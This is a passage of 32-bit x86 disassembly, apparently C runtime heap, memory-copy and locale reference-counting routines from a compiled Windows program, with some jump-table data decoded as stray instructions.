  425eb4:	mov    DWORD PTR [ebp-0x24],eax
  425eb7:	cmp    eax,0x5
  425eba:	jge    0x425ecc
  425ebc:	mov    cx,WORD PTR [eax*2+0x45e030]
  425ec4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425ec9:	inc    eax
  425eca:	jmp    0x425eb4
  425ecc:	xor    eax,eax
  425ece:	mov    DWORD PTR [ebp-0x24],eax
  425ed1:	cmp    eax,0x101
  425ed6:	jge    0x425ee5
  425ed8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ede:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ee2:	inc    eax
  425ee3:	jmp    0x425ece
  425ee5:	xor    eax,eax
  425ee7:	mov    DWORD PTR [ebp-0x24],eax
  425eea:	cmp    eax,0x100
  425eef:	jge    0x425f01
  425ef1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ef7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425efe:	inc    eax
  425eff:	jmp    0x425ee7
  425f01:	mov    DWORD PTR ds:0x45df18,esi
  425f07:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425f0b:	jne    0x425f21
  425f0d:	cmp    esi,DWORD PTR ds:0x45df18
  425f13:	je     0x425f21
  425f15:	push   esi
  425f16:	call   0x425f5a
  425f1b:	pop    ecx
  425f1c:	jmp    0x425f21
  425f1e:	mov    DWORD PTR [ebp-0x1c],edi
  425f21:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f25:	call   0x425f33
  425f2a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f2d:	call   0x42538b
  425f32:	ret    
  425f33:	push   0xd
  425f35:	call   0x42547b
  425f3a:	pop    ecx
  425f3b:	ret    
  425f3c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f43:	jne    0x425f57
  425f45:	push   0xfffffffd
  425f47:	call   0x425dec
  425f4c:	pop    ecx
  425f4d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f57:	xor    eax,eax
  425f59:	ret    
  425f5a:	push   0xc
  425f5c:	push   0x429678
  425f61:	call   0x425350
  425f66:	mov    esi,DWORD PTR [ebp+0x8]
  425f69:	test   esi,esi
  425f6b:	je     0x425fc5
  425f6d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f74:	jne    0x425fb6
  425f76:	push   0x4
  425f78:	call   0x42550f
  425f7d:	pop    ecx
  425f7e:	and    DWORD PTR [ebp-0x4],0x0
  425f82:	push   esi
  425f83:	call   0x426732
  425f88:	pop    ecx
  425f89:	mov    DWORD PTR [ebp-0x1c],eax
  425f8c:	test   eax,eax
  425f8e:	je     0x425f99
  425f90:	push   esi
  425f91:	push   eax
  425f92:	call   0x42675d
  425f97:	pop    ecx
  425f98:	pop    ecx
  425f99:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f9d:	call   0x425fad
  425fa2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425fa6:	jne    0x425fc5
  425fa8:	push   DWORD PTR [ebp+0x8]
  425fab:	jmp    0x425fb7
  425fad:	push   0x4
  425faf:	call   0x42547b
  425fb4:	pop    ecx
  425fb5:	ret    
  425fb6:	push   esi
  425fb7:	push   0x0
  425fb9:	push   DWORD PTR ds:0x45e140
  425fbf:	call   DWORD PTR ds:0x429048
  425fc5:	call   0x42538b
  425fca:	ret    
  425fcb:	push   0xc
  425fcd:	push   0x429688
  425fd2:	call   0x425350
  425fd7:	mov    esi,DWORD PTR [ebp+0x8]
  425fda:	cmp    DWORD PTR ds:0x45e144,0x3
  425fe1:	jne    0x426011
  425fe3:	cmp    esi,DWORD PTR ds:0x45df04
  425fe9:	ja     0x426011
  425feb:	push   0x4
  425fed:	call   0x42550f
  425ff2:	pop    ecx
  425ff3:	and    DWORD PTR [ebp-0x4],0x0
  425ff7:	push   esi
  425ff8:	call   0x426f11
  425ffd:	pop    ecx
  425ffe:	mov    DWORD PTR [ebp-0x1c],eax
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x42603d
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	test   eax,eax
  42600f:	jne    0x426034
  426011:	test   esi,esi
  426013:	jne    0x426016
  426015:	inc    esi
  426016:	cmp    DWORD PTR ds:0x45e144,0x1
  42601d:	je     0x426025
  42601f:	add    esi,0xf
  426022:	and    esi,0xfffffff0
  426025:	push   esi
  426026:	push   0x0
  426028:	push   DWORD PTR ds:0x45e140
  42602e:	call   DWORD PTR ds:0x429030
  426034:	call   0x42538b
  426039:	ret    
  42603a:	mov    esi,DWORD PTR [ebp+0x8]
  42603d:	push   0x4
  42603f:	call   0x42547b
  426044:	pop    ecx
  426045:	ret    
  426046:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42604b:	ja     0x42606f
  42604d:	push   DWORD PTR [esp+0x4]
  426051:	call   0x425fcb
  426056:	test   eax,eax
  426058:	pop    ecx
  426059:	jne    0x426071
  42605b:	cmp    DWORD PTR [esp+0x8],eax
  42605f:	je     0x426071
  426061:	push   DWORD PTR [esp+0x4]
  426065:	call   0x427c32
  42606a:	test   eax,eax
  42606c:	pop    ecx
  42606d:	jne    0x42604d
  42606f:	xor    eax,eax
  426071:	ret    
  426072:	push   DWORD PTR ds:0x45ddc8
  426078:	push   DWORD PTR [esp+0x8]
  42607c:	call   0x426046
  426081:	pop    ecx
  426082:	pop    ecx
  426083:	ret    
  426084:	int3   
  426085:	int3   
  426086:	int3   
  426087:	int3   
  426088:	int3   
  426089:	int3   
  42608a:	int3   
  42608b:	int3   
  42608c:	int3   
  42608d:	int3   
  42608e:	int3   
  42608f:	int3   
  426090:	push   ebp
  426091:	mov    ebp,esp
  426093:	push   edi
  426094:	push   esi
  426095:	mov    esi,DWORD PTR [ebp+0xc]
  426098:	mov    ecx,DWORD PTR [ebp+0x10]
  42609b:	mov    edi,DWORD PTR [ebp+0x8]
  42609e:	mov    eax,ecx
  4260a0:	mov    edx,ecx
  4260a2:	add    eax,esi
  4260a4:	cmp    edi,esi
  4260a6:	jbe    0x4260b0
  4260a8:	cmp    edi,eax
  4260aa:	jb     0x42622c
  4260b0:	test   edi,0x3
  4260b6:	jne    0x4260cc
  4260b8:	shr    ecx,0x2
  4260bb:	and    edx,0x3
  4260be:	cmp    ecx,0x8
  4260c1:	jb     0x4260ec
  4260c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c5:	jmp    DWORD PTR [edx*4+0x4261dc]
  4260cc:	mov    eax,edi
  4260ce:	mov    edx,0x3
  4260d3:	sub    ecx,0x4
  4260d6:	jb     0x4260e4
  4260d8:	and    eax,0x3
  4260db:	add    ecx,eax
  4260dd:	jmp    DWORD PTR [eax*4+0x4260f0]
  4260e4:	jmp    DWORD PTR [ecx*4+0x4261ec]
  4260eb:	nop
  4260ec:	jmp    DWORD PTR [ecx*4+0x426170]
  4260f3:	nop
  4260f4:	add    BYTE PTR [ecx+0x42],ah
  4260f7:	add    BYTE PTR [ecx+eiz*2],ch
  4260fa:	inc    edx
  4260fb:	add    BYTE PTR [eax+0x61],dl
  4260fe:	inc    edx
  4260ff:	add    BYTE PTR [ebx],ah
  426101:	ror    DWORD PTR [edx-0x75f877fa],1
  426107:	inc    esi
  426108:	add    DWORD PTR [eax+0x468a0147],ecx
  42610e:	add    al,cl
  426110:	jmp    0x289e917
  426115:	add    esi,0x3
  426118:	add    edi,0x3
  42611b:	cmp    ecx,0x8
  42611e:	jb     0x4260ec
  426120:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426122:	jmp    DWORD PTR [edx*4+0x4261dc]
  426129:	lea    ecx,[ecx+0x0]
  42612c:	and    edx,ecx
  42612e:	mov    al,BYTE PTR [esi]
  426130:	mov    BYTE PTR [edi],al
  426132:	mov    al,BYTE PTR [esi+0x1]
  426135:	shr    ecx,0x2
  426138:	mov    BYTE PTR [edi+0x1],al
  42613b:	add    esi,0x2
  42613e:	add    edi,0x2
  426141:	cmp    ecx,0x8
  426144:	jb     0x4260ec
  426146:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426148:	jmp    DWORD PTR [edx*4+0x4261dc]
  42614f:	nop
  426150:	and    edx,ecx
  426152:	mov    al,BYTE PTR [esi]
  426154:	mov    BYTE PTR [edi],al
  426156:	add    esi,0x1
  426159:	shr    ecx,0x2
  42615c:	add    edi,0x1
  42615f:	cmp    ecx,0x8
  426162:	jb     0x4260ec
  426164:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426166:	jmp    DWORD PTR [edx*4+0x4261dc]
  42616d:	lea    ecx,[ecx+0x0]
  426170:	shl    DWORD PTR [ecx+0x42],cl
  426173:	add    al,al
  426175:	popa   
  426176:	inc    edx
  426177:	add    BYTE PTR [eax-0x4fffbd9f],bh
  42617d:	popa   
  42617e:	inc    edx
  42617f:	add    BYTE PTR [eax-0x5fffbd9f],ch
  426185:	popa   
  426186:	inc    edx
  426187:	add    BYTE PTR [eax-0x6fffbd9f],bl
  42618d:	popa   
  42618e:	inc    edx
  42618f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426195:	inc    esp
  426196:	(bad)  
  426197:	in     al,0x8b
  426199:	inc    esp
  42619a:	mov    gs,eax
  42619c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261c8:	lea    eax,[ecx*4+0x0]
  4261cf:	add    esi,eax
  4261d1:	add    edi,eax
  4261d3:	jmp    DWORD PTR [edx*4+0x4261dc]
  4261da:	mov    edi,edi
  4261dc:	in     al,dx
  4261dd:	popa   
  4261de:	inc    edx
  4261df:	add    ah,dh
  4261e1:	popa   
  4261e2:	inc    edx
  4261e3:	add    BYTE PTR [eax],al
  4261e5:	bound  eax,QWORD PTR [edx+0x0]
  4261e8:	adc    al,0x62
  4261ea:	inc    edx
  4261eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261f1:	leave  
  4261f2:	ret    
  4261f3:	nop
  4261f4:	mov    al,BYTE PTR [esi]
  4261f6:	mov    BYTE PTR [edi],al
  4261f8:	mov    eax,DWORD PTR [ebp+0x8]
  4261fb:	pop    esi
  4261fc:	pop    edi
  4261fd:	leave  
  4261fe:	ret    
  4261ff:	nop
  426200:	mov    al,BYTE PTR [esi]
  426202:	mov    BYTE PTR [edi],al
  426204:	mov    al,BYTE PTR [esi+0x1]
  426207:	mov    BYTE PTR [edi+0x1],al
  42620a:	mov    eax,DWORD PTR [ebp+0x8]
  42620d:	pop    esi
  42620e:	pop    edi
  42620f:	leave  
  426210:	ret    
  426211:	lea    ecx,[ecx+0x0]
  426214:	mov    al,BYTE PTR [esi]
  426216:	mov    BYTE PTR [edi],al
  426218:	mov    al,BYTE PTR [esi+0x1]
  42621b:	mov    BYTE PTR [edi+0x1],al
  42621e:	mov    al,BYTE PTR [esi+0x2]
  426221:	mov    BYTE PTR [edi+0x2],al
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	pop    esi
  426228:	pop    edi
  426229:	leave  
  42622a:	ret    
  42622b:	nop
  42622c:	lea    esi,[ecx+esi*1-0x4]
  426230:	lea    edi,[ecx+edi*1-0x4]
  426234:	test   edi,0x3
  42623a:	jne    0x426260
  42623c:	shr    ecx,0x2
  42623f:	and    edx,0x3
  426242:	cmp    ecx,0x8
  426245:	jb     0x426254
  426247:	std    
  426248:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624a:	cld    
  42624b:	jmp    DWORD PTR [edx*4+0x426378]
  426252:	mov    edi,edi
  426254:	neg    ecx
  426256:	jmp    DWORD PTR [ecx*4+0x426328]
  42625d:	lea    ecx,[ecx+0x0]
  426260:	mov    eax,edi
  426262:	mov    edx,0x3
  426267:	cmp    ecx,0x4
  42626a:	jb     0x426278
  42626c:	and    eax,0x3
  42626f:	sub    ecx,eax
  426271:	jmp    DWORD PTR [eax*4+0x42627c]
  426278:	jmp    DWORD PTR [ecx*4+0x426378]
  42627f:	nop
  426280:	mov    WORD PTR [edx+0x42],fs
  426283:	add    BYTE PTR [eax-0x27ffbd9e],dh
  426289:	bound  eax,QWORD PTR [edx+0x0]
  42628c:	mov    al,BYTE PTR [esi+0x3]
  42628f:	and    edx,ecx
  426291:	mov    BYTE PTR [edi+0x3],al
  426294:	sub    esi,0x1
  426297:	shr    ecx,0x2
  42629a:	sub    edi,0x1
  42629d:	cmp    ecx,0x8
  4262a0:	jb     0x426254
  4262a2:	std    
  4262a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	cld    
  4262a6:	jmp    DWORD PTR [edx*4+0x426378]
  4262ad:	lea    ecx,[ecx+0x0]
  4262b0:	mov    al,BYTE PTR [esi+0x3]
  4262b3:	and    edx,ecx
  4262b5:	mov    BYTE PTR [edi+0x3],al
  4262b8:	mov    al,BYTE PTR [esi+0x2]
  4262bb:	shr    ecx,0x2
  4262be:	mov    BYTE PTR [edi+0x2],al
  4262c1:	sub    esi,0x2
  4262c4:	sub    edi,0x2
  4262c7:	cmp    ecx,0x8
  4262ca:	jb     0x426254
  4262cc:	std    
  4262cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262cf:	cld    
  4262d0:	jmp    DWORD PTR [edx*4+0x426378]
  4262d7:	nop
  4262d8:	mov    al,BYTE PTR [esi+0x3]
  4262db:	and    edx,ecx
  4262dd:	mov    BYTE PTR [edi+0x3],al
  4262e0:	mov    al,BYTE PTR [esi+0x2]
  4262e3:	mov    BYTE PTR [edi+0x2],al
  4262e6:	mov    al,BYTE PTR [esi+0x1]
  4262e9:	shr    ecx,0x2
  4262ec:	mov    BYTE PTR [edi+0x1],al
  4262ef:	sub    esi,0x3
  4262f2:	sub    edi,0x3
  4262f5:	cmp    ecx,0x8
  4262f8:	jb     0x426254
  4262fe:	std    
  4262ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426301:	cld    
  426302:	jmp    DWORD PTR [edx*4+0x426378]
  426309:	lea    ecx,[ecx+0x0]
  42630c:	sub    al,0x63
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2],dh
  426312:	inc    edx
  426313:	add    BYTE PTR [ebx+eiz*2],bh
  426316:	inc    edx
  426317:	add    BYTE PTR [ebx+eiz*2+0x42],al
  42631b:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  42631f:	add    BYTE PTR [ebx+eiz*2+0x42],dl
  426323:	add    BYTE PTR [ebx+eiz*2+0x42],bl
  426327:	add    BYTE PTR [edi+0x63],ch
  42632a:	inc    edx
  42632b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426331:	inc    esp
  426332:	(bad)  
  426333:	sbb    al,0x8b
  426335:	inc    esp
  426336:	mov    ds,WORD PTR [eax]
  426338:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426340:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426348:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426350:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426354:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426358:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42635c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426360:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426364:	lea    eax,[ecx*4+0x0]
  42636b:	add    esi,eax
  42636d:	add    edi,eax
  42636f:	jmp    DWORD PTR [edx*4+0x426378]
  426376:	mov    edi,edi
  426378:	mov    BYTE PTR [ebx+0x42],ah
  42637b:	add    BYTE PTR [eax-0x5fffbd9d],dl
  426381:	arpl   WORD PTR [edx+0x0],ax
  426384:	mov    ah,0x63
  426386:	inc    edx
  426387:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42638d:	leave  
  42638e:	ret    
  42638f:	nop
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    eax,DWORD PTR [ebp+0x8]
  426399:	pop    esi
  42639a:	pop    edi
  42639b:	leave  
  42639c:	ret    
  42639d:	lea    ecx,[ecx+0x0]
  4263a0:	mov    al,BYTE PTR [esi+0x3]
  4263a3:	mov    BYTE PTR [edi+0x3],al
  4263a6:	mov    al,BYTE PTR [esi+0x2]
  4263a9:	mov    BYTE PTR [edi+0x2],al
  4263ac:	mov    eax,DWORD PTR [ebp+0x8]
  4263af:	pop    esi
  4263b0:	pop    edi
  4263b1:	leave  
  4263b2:	ret    
  4263b3:	nop
  4263b4:	mov    al,BYTE PTR [esi+0x3]
  4263b7:	mov    BYTE PTR [edi+0x3],al
  4263ba:	mov    al,BYTE PTR [esi+0x2]
  4263bd:	mov    BYTE PTR [edi+0x2],al
  4263c0:	mov    al,BYTE PTR [esi+0x1]
  4263c3:	mov    BYTE PTR [edi+0x1],al
  4263c6:	mov    eax,DWORD PTR [ebp+0x8]
  4263c9:	pop    esi
  4263ca:	pop    edi
  4263cb:	leave  
  4263cc:	ret    
  4263cd:	push   DWORD PTR [esp+0x4]
  4263d1:	call   DWORD PTR ds:0x4290cc
  4263d7:	xor    eax,eax
  4263d9:	inc    eax
  4263da:	ret    0x8
  4263dd:	push   0x10
  4263df:	push   0x4296d0
  4263e4:	call   0x425350
  4263e9:	mov    eax,ds:0x45dd88
  4263ee:	test   eax,eax
  4263f0:	jne    0x426429
  4263f2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263f9:	je     0x42641f
  4263fb:	push   0x4296bc
  426400:	call   DWORD PTR ds:0x429024
  426406:	test   eax,eax
  426408:	je     0x42641f
  42640a:	push   0x429694
  42640f:	push   eax
  426410:	call   DWORD PTR ds:0x429020
  426416:	mov    ds:0x45dd88,eax
  42641b:	test   eax,eax
  42641d:	jne    0x426429
  42641f:	mov    eax,0x4263cd
  426424:	mov    ds:0x45dd88,eax
  426429:	and    DWORD PTR [ebp-0x4],0x0
  42642d:	push   DWORD PTR [ebp+0xc]
  426430:	push   DWORD PTR [ebp+0x8]
  426433:	call   eax
  426435:	mov    DWORD PTR [ebp-0x1c],eax
  426438:	jmp    0x42645e
  42643a:	mov    eax,DWORD PTR [ebp-0x14]
  42643d:	mov    eax,DWORD PTR [eax]
  42643f:	mov    eax,DWORD PTR [eax]
  426441:	mov    DWORD PTR [ebp-0x20],eax
  426444:	xor    eax,eax
  426446:	inc    eax
  426447:	ret    
  426448:	mov    esp,DWORD PTR [ebp-0x18]
  42644b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426452:	jne    0x42645c
  426454:	push   0x8
  426456:	call   DWORD PTR ds:0x429098
  42645c:	xor    eax,eax
  42645e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426462:	call   0x42538b
  426467:	ret    
  426468:	push   0x10
  42646a:	push   0x4296e0
  42646f:	call   0x425350
  426474:	mov    esi,DWORD PTR [ebp+0x8]
  426477:	imul   esi,DWORD PTR [ebp+0xc]
  42647b:	mov    DWORD PTR [ebp-0x1c],esi
  42647e:	test   esi,esi
  426480:	jne    0x426483
  426482:	inc    esi
  426483:	xor    edi,edi
  426485:	mov    DWORD PTR [ebp-0x20],edi
  426488:	cmp    esi,0xffffffe0
  42648b:	ja     0x4264f2
  42648d:	cmp    DWORD PTR ds:0x45e144,0x3
  426494:	jne    0x4264dd
  426496:	add    esi,0xf
  426499:	and    esi,0xfffffff0
  42649c:	mov    DWORD PTR [ebp+0xc],esi
  42649f:	mov    ebx,DWORD PTR [ebp-0x1c]
  4264a2:	cmp    ebx,DWORD PTR ds:0x45df04
  4264a8:	ja     0x4264dd
  4264aa:	push   0x4
  4264ac:	call   0x42550f
  4264b1:	pop    ecx
  4264b2:	and    DWORD PTR [ebp-0x4],edi
  4264b5:	push   ebx
  4264b6:	call   0x426f11
  4264bb:	pop    ecx
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264c3:	call   0x426512
  4264c8:	mov    edi,DWORD PTR [ebp-0x20]
  4264cb:	test   edi,edi
  4264cd:	je     0x4264e1
  4264cf:	push   DWORD PTR [ebp-0x1c]
  4264d2:	push   0x0
  4264d4:	push   edi
  4264d5:	call   0x427c50
  4264da:	add    esp,0xc
  4264dd:	test   edi,edi
  4264df:	jne    0x42651b
  4264e1:	push   esi
  4264e2:	push   0x8
  4264e4:	push   DWORD PTR ds:0x45e140
  4264ea:	call   DWORD PTR ds:0x429030
  4264f0:	mov    edi,eax
  4264f2:	test   edi,edi
  4264f4:	jne    0x42651b
  4264f6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264fc:	je     0x42651b
  4264fe:	push   esi
  4264ff:	call   0x427c32
  426504:	pop    ecx
  426505:	test   eax,eax
  426507:	jne    0x426483
  42650d:	jmp    0x42651d
  42650f:	mov    esi,DWORD PTR [ebp+0xc]
  426512:	push   0x4
  426514:	call   0x42547b
  426519:	pop    ecx
  42651a:	ret    
  42651b:	mov    eax,edi
  42651d:	call   0x42538b
  426522:	ret    
  426523:	push   esi
  426524:	mov    esi,DWORD PTR [esp+0x8]
  426528:	mov    eax,DWORD PTR [esi+0x3c]
  42652b:	push   edi
  42652c:	xor    edi,edi
  42652e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426534:	je     0x426599
  426536:	cmp    eax,edi
  426538:	je     0x426599
  42653a:	mov    eax,DWORD PTR [esi+0x2c]
  42653d:	cmp    DWORD PTR [eax],edi
  42653f:	jne    0x426599
  426541:	mov    eax,DWORD PTR [esi+0x34]
  426544:	cmp    eax,edi
  426546:	je     0x426564
  426548:	cmp    DWORD PTR [eax],edi
  42654a:	jne    0x426564
  42654c:	cmp    eax,DWORD PTR ds:0x45def0
  426552:	je     0x426564
  426554:	push   eax
  426555:	call   0x425f5a
  42655a:	push   DWORD PTR [esi+0x3c]
  42655d:	call   0x427e9f
  426562:	pop    ecx
  426563:	pop    ecx
  426564:	mov    eax,DWORD PTR [esi+0x30]
  426567:	cmp    eax,edi
  426569:	je     0x426587
  42656b:	cmp    DWORD PTR [eax],edi
  42656d:	jne    0x426587
  42656f:	cmp    eax,DWORD PTR ds:0x45def4
  426575:	je     0x426587
  426577:	push   eax
  426578:	call   0x425f5a
  42657d:	push   DWORD PTR [esi+0x3c]
  426580:	call   0x427e40
  426585:	pop    ecx
  426586:	pop    ecx
  426587:	push   DWORD PTR [esi+0x2c]
  42658a:	call   0x425f5a
  42658f:	push   DWORD PTR [esi+0x3c]
  426592:	call   0x425f5a
  426597:	pop    ecx
  426598:	pop    ecx
  426599:	mov    eax,DWORD PTR [esi+0x40]
  42659c:	cmp    eax,DWORD PTR ds:0x45deec
  4265a2:	je     0x4265bc
  4265a4:	cmp    eax,edi
  4265a6:	je     0x4265bc
  4265a8:	cmp    DWORD PTR [eax],edi
  4265aa:	jne    0x4265bc
  4265ac:	push   eax
  4265ad:	call   0x425f5a
  4265b2:	push   DWORD PTR [esi+0x44]
  4265b5:	call   0x425f5a
  4265ba:	pop    ecx
  4265bb:	pop    ecx
  4265bc:	mov    eax,DWORD PTR [esi+0x50]
  4265bf:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265c5:	je     0x4265e3
  4265c7:	cmp    eax,edi
  4265c9:	je     0x4265e3
  4265cb:	cmp    DWORD PTR [eax+0xb4],edi
  4265d1:	jne    0x4265e3
  4265d3:	push   eax
  4265d4:	call   0x427cb0
  4265d9:	push   DWORD PTR [esi+0x50]
  4265dc:	call   0x425f5a
  4265e1:	pop    ecx
  4265e2:	pop    ecx
  4265e3:	push   esi
  4265e4:	call   0x425f5a
  4265e9:	pop    ecx
  4265ea:	pop    edi
  4265eb:	pop    esi
  4265ec:	ret    
  4265ed:	push   esi
  4265ee:	call   0x425203
  4265f3:	mov    esi,eax
  4265f5:	mov    eax,DWORD PTR [esi+0x64]
  4265f8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265fe:	je     0x4266aa
  426604:	test   eax,eax
  426606:	je     0x426637
  426608:	mov    ecx,DWORD PTR [eax+0x2c]
  42660b:	dec    DWORD PTR [eax]
  42660d:	test   ecx,ecx
  42660f:	je     0x426613
  426611:	dec    DWORD PTR [ecx]
  426613:	mov    ecx,DWORD PTR [eax+0x34]
  426616:	test   ecx,ecx
  426618:	je     0x42661c
  42661a:	dec    DWORD PTR [ecx]
  42661c:	mov    ecx,DWORD PTR [eax+0x30]
  42661f:	test   ecx,ecx
  426621:	je     0x426625
  426623:	dec    DWORD PTR [ecx]
  426625:	mov    ecx,DWORD PTR [eax+0x40]
  426628:	test   ecx,ecx
  42662a:	je     0x42662e
  42662c:	dec    DWORD PTR [ecx]
  42662e:	mov    ecx,DWORD PTR [eax+0x4c]
  426631:	dec    DWORD PTR [ecx+0xb4]
  426637:	mov    ecx,DWORD PTR ds:0x45d58c
  42663d:	mov    DWORD PTR [esi+0x64],ecx
  426640:	mov    ecx,DWORD PTR ds:0x45d58c
  426646:	inc    DWORD PTR [ecx]
  426648:	mov    ecx,DWORD PTR ds:0x45d58c
  42664e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426651:	test   ecx,ecx
  426653:	je     0x426657
  426655:	inc    DWORD PTR [ecx]
  426657:	mov    ecx,DWORD PTR ds:0x45d58c
  42665d:	mov    ecx,DWORD PTR [ecx+0x34]
  426660:	test   ecx,ecx
  426662:	je     0x426666
  426664:	inc    DWORD PTR [ecx]
  426666:	mov    ecx,DWORD PTR ds:0x45d58c
  42666c:	mov    ecx,DWORD PTR [ecx+0x30]
  42666f:	test   ecx,ecx
  426671:	je     0x426675
  426673:	inc    DWORD PTR [ecx]
  426675:	mov    ecx,DWORD PTR ds:0x45d58c
  42667b:	mov    ecx,DWORD PTR [ecx+0x40]
  42667e:	test   ecx,ecx
  426680:	je     0x426684
  426682:	inc    DWORD PTR [ecx]
  426684:	mov    ecx,DWORD PTR ds:0x45d58c
  42668a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42668d:	inc    DWORD PTR [ecx+0xb4]
  426693:	test   eax,eax
  426695:	je     0x4266aa
  426697:	cmp    DWORD PTR [eax],0x0
  42669a:	jne    0x4266aa
  42669c:	cmp    eax,0x45d538
  4266a1:	je     0x4266aa
  4266a3:	push   eax
  4266a4:	call   0x426523
  4266a9:	pop    ecx
  4266aa:	mov    eax,DWORD PTR [esi+0x64]
  4266ad:	pop    esi
  4266ae:	ret    
  4266af:	push   0xc
  4266b1:	push   0x429870
  4266b6:	call   0x425350
  4266bb:	push   0xc
  4266bd:	call   0x42550f
  4266c2:	pop    ecx
  4266c3:	and    DWORD PTR [ebp-0x4],0x0
  4266c7:	call   0x4265ed
  4266cc:	mov    DWORD PTR [ebp-0x1c],eax
  4266cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266d3:	call   0x4266e1
  4266d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266db:	call   0x42538b
  4266e0:	ret    
  4266e1:	push   0xc
  4266e3:	call   0x42547b
  4266e8:	pop    ecx
  4266e9:	ret    
  4266ea:	push   0x140
  4266ef:	push   0x0
  4266f1:	push   DWORD PTR ds:0x45e140
  4266f7:	call   DWORD PTR ds:0x429030
  4266fd:	test   eax,eax
  4266ff:	mov    ds:0x45df00,eax
  426704:	jne    0x426707
  426706:	ret    
  426707:	mov    ecx,DWORD PTR [esp+0x4]
  42670b:	and    DWORD PTR ds:0x45def8,0x0
  426712:	and    DWORD PTR ds:0x45defc,0x0
  426719:	mov    ds:0x45df08,eax
  42671e:	xor    eax,eax
  426720:	mov    DWORD PTR ds:0x45df04,ecx
  426726:	mov    DWORD PTR ds:0x45df0c,0x10
  426730:	inc    eax
  426731:	ret    
  426732:	mov    eax,ds:0x45defc
  426737:	lea    ecx,[eax+eax*4]
  42673a:	mov    eax,ds:0x45df00
  42673f:	lea    ecx,[eax+ecx*4]
  426742:	jmp    0x426756
  426744:	mov    edx,DWORD PTR [esp+0x4]
  426748:	sub    edx,DWORD PTR [eax+0xc]
  42674b:	cmp    edx,0x100000
  426751:	jb     0x42675c
  426753:	add    eax,0x14
  426756:	cmp    eax,ecx
  426758:	jb     0x426744
  42675a:	xor    eax,eax
  42675c:	ret    
  42675d:	push   ebp
  42675e:	mov    ebp,esp
  426760:	sub    esp,0x10
  426763:	mov    ecx,DWORD PTR [ebp+0x8]
  426766:	mov    eax,DWORD PTR [ecx+0x10]
  426769:	push   esi
  42676a:	mov    esi,DWORD PTR [ebp+0xc]
  42676d:	push   edi
  42676e:	mov    edi,esi
  426770:	sub    edi,DWORD PTR [ecx+0xc]
  426773:	add    esi,0xfffffffc
  426776:	shr    edi,0xf
  426779:	mov    ecx,edi
  42677b:	imul   ecx,ecx,0x204
  426781:	lea    ecx,[ecx+eax*1+0x144]
  426788:	mov    DWORD PTR [ebp-0x10],ecx
  42678b:	mov    ecx,DWORD PTR [esi]
  42678d:	dec    ecx
  42678e:	test   cl,0x1
  426791:	mov    DWORD PTR [ebp-0x4],ecx
  426794:	jne    0x426a71
